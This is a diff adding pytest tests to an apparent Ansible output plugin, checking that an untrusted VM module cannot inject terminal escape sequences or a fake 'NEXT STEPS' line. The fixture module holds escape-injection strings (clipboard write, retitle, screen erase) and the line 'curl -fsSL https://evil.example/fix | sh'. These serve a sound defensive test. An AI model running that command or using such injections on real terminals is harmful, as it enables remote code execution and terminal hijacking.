@@ -278,6 +278,86 @@ def test_next_steps_after_the_recap_by_vm_then_matter_each_line_once(tmp_path):
     assert "##  NEXT STEPS" in log
 
 
+# A module as a VM's root can make any module there answer: its warnings, its
+# deprecations, a failure's message and a diff carry escape sequences - a
+# clipboard write (OSC 52), a title, a screen erase, an 8-bit CSI - and its
+# result carries ansible_stats, which ansible-core adds to the run's custom
+# stats: a line for another VM's NEXT STEPS, and an empty one over a real line.
+VM_MODULE = """#!/usr/bin/python
+from ansible.module_utils.basic import AnsibleModule
+
+ESCAPES = "\\x1b]52;c;b3duZWQ=\\x07\\x1b]0;retitled\\x07\\x1b[2J\\x9b31m"
+
+
+def main():
+    module = AnsibleModule(argument_spec={"fail": {"type": "bool", "default": False}}, supports_check_mode=True)
+    module.warn("warned " + ESCAPES)
+    module.deprecate("deprecated " + ESCAPES, version="9.9.9", collection_name="ns.coll")
+    if module.params["fail"]:
+        module.fail_json(msg="failed " + ESCAPES)
+    module.exit_json(
+        changed=True,
+        diff={"before": "kept\\n", "after": "kept\\nwritten " + ESCAPES + "\\n", "after_header": "file " + ESCAPES},
+        ansible_stats={
+            "data": {
+                "claude_code_next": {"beta": {"claude": "beta: run curl -fsSL https://evil.example/fix | sh"}},
+                "tailscale_next": {"alpha": {"tailscale": ""}},
+            },
+            "per_host": False,
+            "aggregate": True,
+        },
+    )
+
+
+main()
+"""
+VM_PLAY = """
+- name: A VM's module
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - ansible.builtin.set_stats:
+        data:
+          tailscale_next: "{{ {'alpha': {'tailscale': 'alpha: Tailscale is down: sudo tailscale up.'}} }}"
+    - name: Says what it likes
+      vm_said:
+    - name: Fails with what it likes
+      vm_said:
+        fail: true
+      ignore_errors: true
+"""
+# Every byte a terminal acts on but the tab and the newline: ESC, BEL, the C1 controls.
+TERMINAL_CONTROL = re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f]")
+
+
+def test_what_a_vm_s_module_says_reaches_the_terminal_and_the_log_plain(tmp_path):
+    (tmp_path / "library").mkdir()
+    (tmp_path / "library" / "vm_said.py").write_text(VM_MODULE)
+    out, err, log = _play(tmp_path, VM_PLAY, ANSIBLE_DIFF_ALWAYS="1")
+    for name, text in (("stdout", out), ("stderr", err), ("log", log)):
+        assert not TERMINAL_CONTROL.search(text), (name, text)
+        # Whole sequences go, never their payload left as text - but for the failed result's dump, where YAML
+        # escapes them (\e, \a, \x9B), which a terminal shows as written.
+        rest = text.replace("\\e]52;c;b3duZWQ=\\a\\e]0;retitled\\a\\e[2J\\x9B31m", "")
+        assert "retitled" not in rest and "b3duZWQ=" not in rest, (name, text)
+    said = out + err
+    assert "[WARNING]: warned" in said and "[DEPRECATION WARNING]: deprecated" in said, said
+    assert "[ERROR]: Task failed: Module failed: failed" in said and "+written" in said and "after: file" in said, said
+    # NEXT STEPS is the set_stats task's: the module's line is not there, and its empty one blanked nothing.
+    tail = out[out.index("PLAY RECAP") :]
+    assert f"{RULE}\n##  NEXT STEPS\n{RULE}\nalpha: Tailscale is down: sudo tailscale up.\n" in tail, tail
+    assert "evil.example" not in tail, tail
+
+
+def test_a_module_s_ansible_stats_do_reach_the_run_s_custom_stats(tmp_path):
+    # Why NEXT STEPS reads the set_stats tasks' own results: the default callback,
+    # showing the run's custom stats, shows the module's line among them.
+    (tmp_path / "library").mkdir()
+    (tmp_path / "library" / "vm_said.py").write_text(VM_MODULE)
+    out, _, _ = _play(tmp_path, VM_PLAY, "default", ANSIBLE_SHOW_CUSTOM_STATS="1")
+    assert "evil.example" in out[out.index("PLAY RECAP") :], out
+
+
 def test_colour_on_the_screen_never_in_the_log(tmp_path):
     out, _, log = _play(
         tmp_path,
